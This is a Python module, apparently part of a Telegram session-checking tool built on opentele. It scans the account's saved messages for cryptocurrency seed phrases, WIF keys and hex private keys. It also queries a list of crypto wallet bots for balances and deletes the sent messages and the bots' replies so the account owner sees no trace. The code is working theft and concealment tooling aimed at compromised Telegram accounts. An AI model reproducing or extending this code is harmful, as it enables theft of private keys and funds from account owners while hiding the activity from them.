# -*- coding: utf-8 -*-
import asyncio
import re
import logging
from opentele.tl import TelegramClient
from .text import parsing_crypto_from_srting

logging.basicConfig(level=logging.INFO)

async def wait_for_response(client: TelegramClient, chat: str) -> str:
    """
    Wait for a response in the chat and process messages to extract balance information.

    Args:
        client (TelegramClient): The Telegram client.
        chat (str): The chat (bot) to interact with.

    Returns:
        str: The extracted balance information or '0' if not found.
    """
    for i in range(20):
        await asyncio.sleep(1)
        try:
            entity = await client.get_entity(chat)
            messages = await client.get_messages(chat)
            for event in messages:
                if "ℹ️" in event.text:
                    try:
                        kb = event.reply_markup.rows[0].buttons[0].text
                        if '💼' in kb or '🏦' in kb:
                            message = await client.send_message(entity, kb)
                            await client.delete_messages(entity, [message.id])
                            await client.delete_messages(entity, [event.id])
                    except Exception as e:
                        logging.error(f"Error processing info button: {e}")
                elif '💼' in event.text or '🏦' in event.text:
                    try:
                        await client.delete_messages(entity, [event.id])
                    except Exception as e:
                        logging.error(f"Error deleting message: {e}")
                    balance = re.findall(r'(\d+.\d+\s\w+)|(\d+\s{0,1}\w+)\n', event.text)[0][1]
                    return str(balance)
                else:
                    try:
                        await client.delete_messages(entity, [event.id])
                    except Exception as e:
                        logging.error(f"Error deleting message: {e}")
        except Exception as e:
            logging.error(f"Error in wait_for_response loop: {e}")
    return '0'


async def check_user_messages_is_crypto(client: TelegramClient, config: dict) -> tuple:
    """
    Check user messages for cryptocurrency information.

    Args:
        client (TelegramClient): The Telegram client.
        config (dict): Configuration for parsing.

    Returns:
        tuple: Lists of seeds, WIFs, and HEXs found in the messages.
    """
    try:
        seeds = []
        wifs = []
        hexs = []
        entity = await client.get_entity('me')
        async for m in client.iter_messages(entity):
            try:
                seeds_now, wif_now, hex_now = await parsing_crypto_from_srting(str(m.text).lower(), config)
                seeds.extend(seeds_now)
                wifs.extend(wif_now)
                hexs.extend(hex_now)
            except Exception as e:
                logging.error(f"Error parsing message: {e}")

        return seeds, wifs, hexs
    except Exception as e:
        logging.error(f"Error in check_user_messages_is_crypto: {e}")
        return [], [], []


async def check_user_bots(client: TelegramClient) -> str:
    """
    Check balances from various cryptocurrency bots.

    Args:
        client (TelegramClient): The Telegram client.

    Returns:
        str: Balance information from the bots.
    """
    balance_info = ''

    async def work(chat: str) -> str:
        balance_info = ''
        try:
            message = await client.send_message(chat, '/start')
            balance_message = await wait_for_response(client, chat)
            if balance_message != '0':
                balance_info = f'$    {chat}: {balance_message}\n'
                await client.delete_messages(chat, [message.id])
        except Exception as e:
            logging.error(f"Error interacting with bot {chat}: {e}")
        return balance_info

    bot_list = ['BTC_CHANGE_BOT', 'ETH_CHANGE_BOT', 'LTC_CHANGE_BOT', 'DASH_CHANGE_BOT', 'BCC_CHANGE_BOT', 'DOGE_CHANGE_BOT', 'TETHER_CHANGE_BOT', 'RUBM_CHANGE_BOT']
    for chat in bot_list:
        balance_info_ = await work(chat)
        if balance_info_:
            balance_info += balance_info_

    return balance_info